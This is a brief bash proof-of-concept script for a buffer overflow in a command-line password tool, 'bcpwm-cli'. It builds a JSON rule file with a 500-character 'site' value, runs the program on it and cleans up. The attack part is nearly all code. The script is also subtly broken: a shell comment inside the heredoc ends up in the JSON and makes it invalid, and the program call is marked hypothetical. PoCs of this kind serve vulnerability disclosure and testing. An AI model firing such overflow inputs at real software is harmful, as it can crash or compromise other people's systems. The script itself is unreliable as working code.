#!/bin/bash

# Description: This script demonstrates a buffer overflow vulnerability by providing an oversized "site" value in the JSON rule file.

echo "===== Buffer Overflow Proof of Concept ====="
echo

# Step 1: Create the malicious JSON file with an oversized "site" field
echo "[*] Creating malicious JSON rule file with an oversized 'site' field..."

cat > malicious_rules.json << EOF
{
  "chars": "abcABC",
  "min_length": "8",
  "max_length": "12",
  "rules": {
    "0": "[[:alpha:]]",
    "1": "[[:digit:]]"
  },
  "min_rules": "1",
  "num_rules": "2",
  "site": "$(python3 -c 'print("A" * 500)' | tr -d '\n')"  # Injects an excessively long string to overflow the buffer
}
EOF

echo "[+] Malicious JSON file 'malicious_rules.json' created."
echo

# Step 2: Run the vulnerable application with the malicious JSON file
# Replace './bcpwm-cli' with the actual command if different
echo "[*] Running the application with the malicious JSON file..."

./bcpwm-cli -a malicious_rules.json  # Hypothetical command to load JSON rule file



# Step 3: Clean up
echo
echo "[*] Cleaning up malicious JSON file..."
rm -f malicious_rules.json

echo "===== Proof of Concept Completed ====="